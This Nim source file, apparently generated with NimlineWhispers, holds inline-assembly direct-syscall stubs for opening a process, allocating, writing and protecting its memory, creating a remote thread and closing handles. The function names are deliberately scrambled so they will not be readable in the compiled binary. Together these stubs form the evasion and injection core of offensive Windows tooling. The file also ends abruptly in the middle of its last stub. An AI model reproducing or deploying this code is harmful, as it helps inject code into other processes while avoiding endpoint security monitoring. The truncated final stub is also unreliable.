{.passC:"-masm=intel".}

# Contains direct syscalls
# Generated with NimlineWhispers by ajpc500
# Function names are renamed since they will be readable in the binary

# NtAllocateVirtualMemory -> CkzEIpXrlBNcxNyG
# NtWriteVirtualMemory -> HOdIFVAdjQWNamsW
# NtOpenProcess -> MSxlQNGtaQVDzcXz
# NtCreateThreadEx -> VzJWdBdsTaqTGsey
# NtClose -> FiuxrPXNssolHiEa
# NtProtectVirtualMemory -> XnnlWrMywNrFZycU

type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST

proc VzJWdBdsTaqTGsey*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
    asm """
	mov rax, gs:[0x60]                      
VzJWdBdsTaqTGsey_Check_X_X_XXXX:               
	cmp dword ptr [rax+0x118], 6
	je  VzJWdBdsTaqTGsey_Check_6_X_XXXX
	cmp dword ptr [rax+0x118], 10
	je  VzJWdBdsTaqTGsey_Check_10_0_XXXX
	jmp VzJWdBdsTaqTGsey_SystemCall_Unknown
VzJWdBdsTaqTGsey_Check_6_X_XXXX:               
	cmp dword ptr [rax+0x11c], 1
	je  VzJWdBdsTaqTGsey_Check_6_1_XXXX
	cmp dword ptr [rax+0x11c], 2
	je  VzJWdBdsTaqTGsey_SystemCall_6_2_XXXX
	cmp dword ptr [rax+0x11c], 3
	je  VzJWdBdsTaqTGsey_SystemCall_6_3_XXXX
	jmp VzJWdBdsTaqTGsey_SystemCall_Unknown
VzJWdBdsTaqTGsey_Check_6_1_XXXX:               
	cmp word ptr [rax+0x120], 7600
	je  VzJWdBdsTaqTGsey_SystemCall_6_1_7600
	cmp word ptr [rax+0x120], 7601
	je  VzJWdBdsTaqTGsey_SystemCall_6_1_7601
	jmp VzJWdBdsTaqTGsey_SystemCall_Unknown
VzJWdBdsTaqTGsey_Check_10_0_XXXX:              
	cmp word ptr [rax+0x120], 10240
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_10240
	cmp word ptr [rax+0x120], 10586
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_10586
	cmp word ptr [rax+0x120], 14393
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_14393
	cmp word ptr [rax+0x120], 15063
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_15063
	cmp word ptr [rax+0x120], 16299
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_16299
	cmp word ptr [rax+0x120], 17134
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_17134
	cmp word ptr [rax+0x120], 17763
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_17763
	cmp word ptr [rax+0x120], 18362
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_18362
	cmp word ptr [rax+0x120], 18363
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_18363
	cmp word ptr [rax+0x120], 19041
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_19041
	cmp word ptr [rax+0x120], 19042
	je  VzJWdBdsTaqTGsey_SystemCall_10_0_19042
	jmp VzJWdBdsTaqTGsey_SystemCall_Unknown
VzJWdBdsTaqTGsey_SystemCall_6_1_7600:          
	mov eax, 0x00a5
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_6_1_7601:          
	mov eax, 0x00a5
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_6_2_XXXX:          
	mov eax, 0x00af
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_6_3_XXXX:          
	mov eax, 0x00b0
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_10240:        
	mov eax, 0x00b3
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_10586:        
	mov eax, 0x00b4
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_14393:        
	mov eax, 0x00b6
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_15063:        
	mov eax, 0x00b9
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_16299:        
	mov eax, 0x00ba
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_17134:        
	mov eax, 0x00bb
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_17763:        
	mov eax, 0x00bc
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_18362:        
	mov eax, 0x00bd
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_18363:        
	mov eax, 0x00bd
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_19041:        
	mov eax, 0x00c1
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_10_0_19042:        
	mov eax, 0x00c1
	jmp VzJWdBdsTaqTGsey_Epilogue
VzJWdBdsTaqTGsey_SystemCall_Unknown:           
	ret
VzJWdBdsTaqTGsey_Epilogue:
	mov r10, rcx
	nop
    nop
    syscall
    nop
	ret
    """

proc MSxlQNGtaQVDzcXz*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
    asm """
	mov rax, gs:[0x60]                   
MSxlQNGtaQVDzcXz_Check_X_X_XXXX:               
	cmp dword ptr [rax+0x118], 6
	je  MSxlQNGtaQVDzcXz_Check_6_X_XXXX
	cmp dword ptr [rax+0x118], 10
	je  MSxlQNGtaQVDzcXz_Check_10_0_XXXX
	jmp MSxlQNGtaQVDzcXz_SystemCall_Unknown
MSxlQNGtaQVDzcXz_Check_6_X_XXXX:               
	cmp dword ptr [rax+0x11c], 1
	je  MSxlQNGtaQVDzcXz_Check_6_1_XXXX
	cmp dword ptr [rax+0x11c], 2
	je  MSxlQNGtaQVDzcXz_SystemCall_6_2_XXXX
	cmp dword ptr [rax+0x11c], 3
	je  MSxlQNGtaQVDzcXz_SystemCall_6_3_XXXX
	jmp MSxlQNGtaQVDzcXz_SystemCall_Unknown
MSxlQNGtaQVDzcXz_Check_6_1_XXXX:               
	cmp word ptr [rax+0x120], 7600
	je  MSxlQNGtaQVDzcXz_SystemCall_6_1_7600
	cmp word ptr [rax+0x120], 7601
	je  MSxlQNGtaQVDzcXz_SystemCall_6_1_7601
	jmp MSxlQNGtaQVDzcXz_SystemCall_Unknown
MSxlQNGtaQVDzcXz_Check_10_0_XXXX:              
	cmp word ptr [rax+0x120], 10240
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_10240
	cmp word ptr [rax+0x120], 10586
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_10586
	cmp word ptr [rax+0x120], 14393
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_14393
	cmp word ptr [rax+0x120], 15063
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_15063
	cmp word ptr [rax+0x120], 16299
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_16299
	cmp word ptr [rax+0x120], 17134
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_17134
	cmp word ptr [rax+0x120], 17763
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_17763
	cmp word ptr [rax+0x120], 18362
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_18362
	cmp word ptr [rax+0x120], 18363
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_18363
	cmp word ptr [rax+0x120], 19041
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_19041
	cmp word ptr [rax+0x120], 19042
	je  MSxlQNGtaQVDzcXz_SystemCall_10_0_19042
	jmp MSxlQNGtaQVDzcXz_SystemCall_Unknown
MSxlQNGtaQVDzcXz_SystemCall_6_1_7600:          
	mov eax, 0x0023
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_6_1_7601:          
	mov eax, 0x0023
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_6_2_XXXX:          
	mov eax, 0x0024
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_6_3_XXXX:          
	mov eax, 0x0025
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_10240:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_10586:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_14393:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_15063:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_16299:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_17134:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_17763:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_18362:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_18363:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_19041:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_10_0_19042:        
	mov eax, 0x0026
	jmp MSxlQNGtaQVDzcXz_Epilogue
MSxlQNGtaQVDzcXz_SystemCall_Unknown:           
	ret
MSxlQNGtaQVDzcXz_Epilogue:
	mov r10, rcx
	nop
    nop
    syscall
    nop
	ret
    """

proc FiuxrPXNssolHiEa*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
    asm """
	mov rax, gs:[0x60]             
FiuxrPXNssolHiEa_Check_X_X_XXXX:               
	cmp dword ptr [rax+0x118], 6
	je  FiuxrPXNssolHiEa_Check_6_X_XXXX
	cmp dword ptr [rax+0x118], 10
	je  FiuxrPXNssolHiEa_Check_10_0_XXXX
	jmp FiuxrPXNssolHiEa_SystemCall_Unknown
FiuxrPXNssolHiEa_Check_6_X_XXXX:               
	cmp dword ptr [rax+0x11c], 1
	je  FiuxrPXNssolHiEa_Check_6_1_XXXX
	cmp dword ptr [rax+0x11c], 2
	je  FiuxrPXNssolHiEa_SystemCall_6_2_XXXX
	cmp dword ptr [rax+0x11c], 3
	je  FiuxrPXNssolHiEa_SystemCall_6_3_XXXX
	jmp FiuxrPXNssolHiEa_SystemCall_Unknown
FiuxrPXNssolHiEa_Check_6_1_XXXX:               
	cmp word ptr [rax+0x120], 7600
	je  FiuxrPXNssolHiEa_SystemCall_6_1_7600
	cmp word ptr [rax+0x120], 7601
	je  FiuxrPXNssolHiEa_SystemCall_6_1_7601
	jmp FiuxrPXNssolHiEa_SystemCall_Unknown
FiuxrPXNssolHiEa_Check_10_0_XXXX:              
	cmp word ptr [rax+0x120], 10240
	je  FiuxrPXNssolHiEa_SystemCall_10_0_10240
	cmp word ptr [rax+0x120], 10586
	je  FiuxrPXNssolHiEa_SystemCall_10_0_10586
	cmp word ptr [rax+0x120], 14393
	je  FiuxrPXNssolHiEa_SystemCall_10_0_14393
	cmp word ptr [rax+0x120], 15063
	je  FiuxrPXNssolHiEa_SystemCall_10_0_15063
	cmp word ptr [rax+0x120], 16299
	je  FiuxrPXNssolHiEa_SystemCall_10_0_16299
	cmp word ptr [rax+0x120], 17134
	je  FiuxrPXNssolHiEa_SystemCall_10_0_17134
	cmp word ptr [rax+0x120], 17763
	je  FiuxrPXNssolHiEa_SystemCall_10_0_17763
	cmp word ptr [rax+0x120], 18362
	je  FiuxrPXNssolHiEa_SystemCall_10_0_18362
	cmp word ptr [rax+0x120], 18363
	je  FiuxrPXNssolHiEa_SystemCall_10_0_18363
	cmp word ptr [rax+0x120], 19041
	je  FiuxrPXNssolHiEa_SystemCall_10_0_19041
	cmp word ptr [rax+0x120], 19042
	je  FiuxrPXNssolHiEa_SystemCall_10_0_19042
	jmp FiuxrPXNssolHiEa_SystemCall_Unknown
FiuxrPXNssolHiEa_SystemCall_6_1_7600:          
	mov eax, 0x000c
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_6_1_7601:          
	mov eax, 0x000c
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_6_2_XXXX:          
	mov eax, 0x000d
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_6_3_XXXX:          
	mov eax, 0x000e
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_10240:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_10586:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_14393:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_15063:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_16299:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_17134:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_17763:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_18362:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_18363:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_19041:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_10_0_19042:        
	mov eax, 0x000f
	jmp FiuxrPXNssolHiEa_Epilogue
FiuxrPXNssolHiEa_SystemCall_Unknown:           
	ret
FiuxrPXNssolHiEa_Epilogue:
	mov r10, rcx
	nop
    nop
    syscall
    nop
	ret
    """

proc HOdIFVAdjQWNamsW*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm """
	mov rax, gs:[0x60]                          
HOdIFVAdjQWNamsW_Check_X_X_XXXX:               
	cmp dword ptr [rax+0x118], 6
	je  HOdIFVAdjQWNamsW_Check_6_X_XXXX
	cmp dword ptr [rax+0x118], 10
	je  HOdIFVAdjQWNamsW_Check_10_0_XXXX
	jmp HOdIFVAdjQWNamsW_SystemCall_Unknown
HOdIFVAdjQWNamsW_Check_6_X_XXXX:               
	cmp dword ptr [rax+0x11c], 1
	je  HOdIFVAdjQWNamsW_Check_6_1_XXXX
	cmp dword ptr [rax+0x11c], 2
	je  HOdIFVAdjQWNamsW_SystemCall_6_2_XXXX
	cmp dword ptr [rax+0x11c], 3
	je  HOdIFVAdjQWNamsW_SystemCall_6_3_XXXX
	jmp HOdIFVAdjQWNamsW_SystemCall_Unknown
HOdIFVAdjQWNamsW_Check_6_1_XXXX:               
	cmp word ptr [rax+0x120], 7600
	je  HOdIFVAdjQWNamsW_SystemCall_6_1_7600
	cmp word ptr [rax+0x120], 7601
	je  HOdIFVAdjQWNamsW_SystemCall_6_1_7601
	jmp HOdIFVAdjQWNamsW_SystemCall_Unknown
HOdIFVAdjQWNamsW_Check_10_0_XXXX:              
	cmp word ptr [rax+0x120], 10240
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_10240
	cmp word ptr [rax+0x120], 10586
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_10586
	cmp word ptr [rax+0x120], 14393
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_14393
	cmp word ptr [rax+0x120], 15063
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_15063
	cmp word ptr [rax+0x120], 16299
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_16299
	cmp word ptr [rax+0x120], 17134
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_17134
	cmp word ptr [rax+0x120], 17763
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_17763
	cmp word ptr [rax+0x120], 18362
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_18362
	cmp word ptr [rax+0x120], 18363
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_18363
	cmp word ptr [rax+0x120], 19041
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_19041
	cmp word ptr [rax+0x120], 19042
	je  HOdIFVAdjQWNamsW_SystemCall_10_0_19042
	jmp HOdIFVAdjQWNamsW_SystemCall_Unknown
HOdIFVAdjQWNamsW_SystemCall_6_1_7600:          
	mov eax, 0x0037
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_6_1_7601:          
	mov eax, 0x0037
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_6_2_XXXX:          
	mov eax, 0x0038
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_6_3_XXXX:          
	mov eax, 0x0039
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_10240:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_10586:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_14393:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_15063:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_16299:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_17134:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_17763:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_18362:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_18363:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_19041:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_10_0_19042:        
	mov eax, 0x003a
	jmp HOdIFVAdjQWNamsW_Epilogue
HOdIFVAdjQWNamsW_SystemCall_Unknown:           
	ret
HOdIFVAdjQWNamsW_Epilogue:
	mov r10, rcx
	nop
    nop
    syscall
    nop
	ret
    """

proc CkzEIpXrlBNcxNyG*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
	mov rax, gs:[0x60]                             
CkzEIpXrlBNcxNyG_Check_X_X_XXXX:               
	cmp dword ptr [rax+0x118], 6
	je  CkzEIpXrlBNcxNyG_Check_6_X_XXXX
	cmp dword ptr [rax+0x118], 10
	je  CkzEIpXrlBNcxNyG_Check_10_0_XXXX
	jmp CkzEIpXrlBNcxNyG_SystemCall_Unknown
CkzEIpXrlBNcxNyG_Check_6_X_XXXX:               
	cmp dword ptr [rax+0x11c], 1
	je  CkzEIpXrlBNcxNyG_Check_6_1_XXXX
	cmp dword ptr [rax+0x11c], 2
	je  CkzEIpXrlBNcxNyG_SystemCall_6_2_XXXX
	cmp dword ptr [rax+0x11c], 3
	je  CkzEIpXrlBNcxNyG_SystemCall_6_3_XXXX
	jmp CkzEIpXrlBNcxNyG_SystemCall_Unknown
CkzEIpXrlBNcxNyG_Check_6_1_XXXX:               
	cmp word ptr [rax+0x120], 7600
	je  CkzEIpXrlBNcxNyG_SystemCall_6_1_7600
	cmp word ptr [rax+0x120], 7601
	je  CkzEIpXrlBNcxNyG_SystemCall_6_1_7601
	jmp CkzEIpXrlBNcxNyG_SystemCall_Unknown
CkzEIpXrlBNcxNyG_Check_10_0_XXXX:              
	cmp word ptr [rax+0x120], 10240
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_10240
	cmp word ptr [rax+0x120], 10586
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_10586
	cmp word ptr [rax+0x120], 14393
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_14393
	cmp word ptr [rax+0x120], 15063
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_15063
	cmp word ptr [rax+0x120], 16299
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_16299
	cmp word ptr [rax+0x120], 17134
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_17134
	cmp word ptr [rax+0x120], 17763
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_17763
	cmp word ptr [rax+0x120], 18362
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_18362
	cmp word ptr [rax+0x120], 18363
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_18363
	cmp word ptr [rax+0x120], 19041
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_19041
	cmp word ptr [rax+0x120], 19042
	je  CkzEIpXrlBNcxNyG_SystemCall_10_0_19042
	jmp CkzEIpXrlBNcxNyG_SystemCall_Unknown
CkzEIpXrlBNcxNyG_SystemCall_6_1_7600:          
	mov eax, 0x0015
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_6_1_7601:          
	mov eax, 0x0015
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_6_2_XXXX:          
	mov eax, 0x0016
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_6_3_XXXX:          
	mov eax, 0x0017
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_10240:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_10586:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_14393:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_15063:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_16299:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_17134:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_17763:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_18362:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_18363:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_19041:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_10_0_19042:        
	mov eax, 0x0018
	jmp CkzEIpXrlBNcxNyG_Epilogue
CkzEIpXrlBNcxNyG_SystemCall_Unknown:           
	ret
CkzEIpXrlBNcxNyG_Epilogue:
	mov r10, rcx
	nop
    nop
    syscall
    nop
	ret
    """

proc XnnlWrMywNrFZycU*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
	mov rax, gs:[0x60]                            
XnnlWrMywNrFZycU_Check_X_X_XXXX:               
	cmp dword ptr [rax+0x118], 6
	je  XnnlWrMywNrFZycU_Check_6_X_XXXX
	cmp dword ptr [rax+0x118], 10
	je  XnnlWrMywNrFZycU_Check_10_0_XXXX
	jmp XnnlWrMywNrFZycU_SystemCall_Unknown
XnnlWrMywNrFZycU_Check_6_X_XXXX:               
	cmp dword ptr [rax+0x11c], 1
	je  XnnlWrMywNrFZycU_Check_6_1_XXXX
	cmp dword ptr [rax+0x11c], 2
	je  XnnlWrMywNrFZycU_SystemCall_6_2_XXXX
	cmp dword ptr [rax+0x11c], 3
	je  XnnlWrMywNrFZycU_SystemCall_6_3_XXXX
	jmp XnnlWrMywNrFZycU_SystemCall_Unknown
XnnlWrMywNrFZycU_Check_6_1_XXXX:               
	cmp word ptr [rax+0x120], 7600
	je  XnnlWrMywNrFZycU_SystemCall_6_1_7600
	cmp word ptr [rax+0x120], 7601
	je  XnnlWrMywNrFZycU_SystemCall_6_1_7601
	jmp XnnlWrMywNrFZycU_SystemCall_Unknown
XnnlWrMywNrFZycU_Check_10_0_XXXX:              
	cmp word ptr [rax+0x120], 10240
	je  XnnlWrMywNrFZycU_SystemCall_10_0_10240
	cmp word ptr [rax+0x120], 10586
	je  XnnlWrMywNrFZycU_SystemCall_10_0_10586
	cmp word ptr [rax+0x120], 14393
	je  XnnlWrMywNrFZycU_SystemCall_10_0_14393
	cmp word ptr [rax+0x120], 15063
	je  XnnlWrMywNrFZycU_SystemCall_10_0_15063
	cmp word ptr [rax+0x120], 16299
	je  XnnlWrMywNrFZycU_SystemCall_10_0_16299
	cmp word ptr [rax+0x120], 17134
	je  XnnlWrMywNrFZycU_SystemCall_10_0_17134
	cmp word ptr [rax+0x120], 17763
	je  XnnlWrMywNrFZycU_SystemCall_10_0_17763
	cmp word ptr [rax+0x120], 18362
	je  XnnlWrMywNrFZycU_SystemCall_10_0_18362
	cmp word ptr [rax+0x120], 18363
	je  XnnlWrMywNrFZycU_SystemCall_10_0_18363
	cmp word ptr [rax+0x120], 19041
	je  XnnlWrMywNrFZycU_SystemCall_10_0_19041
	cmp word ptr [rax+0x120], 19042
	je  XnnlWrMywNrFZycU_SystemCall_10_0_19042
	jmp XnnlWrMywNrFZycU_SystemCall_Unknown
XnnlWrMywNrFZycU_SystemCall_6_1_7600:          
	mov eax, 0x004d
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_6_1_7601:          
	mov eax, 0x004d
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_6_2_XXXX:          
	mov eax, 0x004e
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_6_3_XXXX:          
	mov eax, 0x004f
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_10240:        
	mov eax, 0x0050
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_10586:        
	mov eax, 0x0050
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_14393:        
	mov eax, 0x0050
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_15063:        
	mov eax, 0x0050
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_16299:        
	mov eax, 0x0050
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_17134:        
	mov eax, 0x0050
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_17763:        
	mov eax, 0x0050
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_18362:        
	mov eax, 0x0050
	jmp XnnlWrMywNrFZycU_Epilogue
XnnlWrMywNrFZycU_SystemCall_10_0_18363:        
	mov eax, 0x0050
